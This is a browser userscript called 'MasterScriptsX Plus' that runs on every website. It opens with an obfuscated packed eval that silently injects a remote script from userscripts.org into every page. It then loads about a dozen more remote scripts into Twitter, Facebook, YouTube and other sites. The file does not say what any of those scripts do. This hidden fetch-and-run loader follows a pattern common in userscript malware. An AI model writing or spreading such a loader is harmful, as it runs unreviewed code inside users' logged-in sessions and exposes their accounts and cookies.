// ==UserScript==
// @name   MasterScriptsX Plus
// @version 01.08.0075
// @description Version 01.08.0075
// @author  .paradise
// @include http://*
// @include https://*
// @include		   http://www.facebook.com/*
// @include		   https://www.facebook.com/*
// @exclude http://acid3.acidtests.org/*
// @updateURL http://userscripts.org/scripts/source/115055.meta.js
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))




AUTO=-1;OFF=0;ON=1;user='//userscripts.org/scripts/source/';

(function(){if(''!=document.title){h=document.getElementsByTagName('head')[0];if(location.href.match(/(:\/\/)(acid3\.acidtests\.org\/)/)){;
}if((!location.href.match(/(:\/\/)(\w*\.?twitter\.com\/)$/))&&(!location.href.match(/(:\/\/)(\w*\.?twitter\.com\/)(|#!\/)(activity\/?)$/))&&(location.href.match(/(:\/\/)(\w*\.?twitter\.com\/)/))){
  if(ON){s=document.createElement('script');s.src=user+'112768.user.js';h.appendChild(s);}
}if(location.href.match(/(:\/\/)(\w*\.?twitter\.com\/|twipple\.jp\/|standard\.cotweet\.com\/|hootsuite\.com\/|www\.crowy\.net\/)/)){
  if(ON){s=document.createElement('script');s.src=user+'106779.user.js';h.appendChild(s);}
}if(location.href.match(/(:\/\/)(\w*\.?twitter\.com\/|\w*\.?nicovideo\.jp\/|\w*\.?facebook\.com\/|www\.myspace\.com\/|www\.sopcast\.com\/|www\.easetuner\.com\/|www\.crowy\.net\/|www\.mbok\.jp\/|www\.bidders\.co\.jp\/|\w+\.moshimo\.com\/|\w+\.fanky\.\w+\/|joysound\.com\/|\w+\.clubdam\.com\/app\/damtomo\/)/)){
  if(ON){s=document.createElement('script');s.src=user+'111550.user.js';h.appendChild(s);}
}if(location.href.match(/(:\/\/)(\w*\.?twitter\.com\/)/)){
  if(ON){s=document.createElement('script');s.src=user+'118850.user.js';h.appendChild(s);}
  if(ON){s=document.createElement('script');s.src=user+'114063.user.js';h.appendChild(s);}
  if(ON){s=document.createElement('script');s.src=user+'109876.user.js';h.appendChild(s);}
  if(ON){s=document.createElement('script');s.src=user+'99236.user.js';h.appendChild(s);}
  if(ON){s=document.createElement('script');s.src=user+'99309.user.js';h.appendChild(s);}
}if((!location.href.match(/(:\/\/)(p\d+\.\d+ch\.io\/getf\.cgi\?|\w*\.?\d+ch.net\/test\/bbs\.cgi\?guid=)/))&&(location.href.match(/(:\/\/)(\w*\.?2ch\.net\/|\w*\.?bbspink.com\/|\w*\.?unkar\.org\/|jbbs\.livedoor\.jp\/|logsoku\.com\/thread\/)/))){
  if(ON){s=document.createElement('script');s.src=user+'150101.user.js';h.appendChild(s);}
}if(location.href.match(/(:\/\/)(\w*\.?youtube\.com\/)(watch\/?[\?\#]!?v=|watch\/?[\?\#]!?videos=|)/)){
  if(ON){s=document.createElement('script');s.src=user+'78184.user.js';h.appendChild(s);}
}if((!location.href.match(/(:\/\/)(\w*\.?youtube\.com\/)(my_|embed\/)/))&&(location.href.match(/(:\/\/)(\w*\.?youtube\.com\/)/))){
  if(ON){s=document.createElement('script');s.src=user+'39167.user.js';h.appendChild(s);}
}if(!location.href.match(/(:\/\/)(\w*\.?twitter\.com\/|\w*\.?facebook\.com\/|i-mobile\.co\.jp\/|[\w\-]*\.?nicovi|[\w\-]*\.?google\.[\w\-\.]+\/|translate|ad)/)){
  if(ON){s=document.createElement('script');s.src=user+'110178.user.js';h.appendChild(s);}
}}})();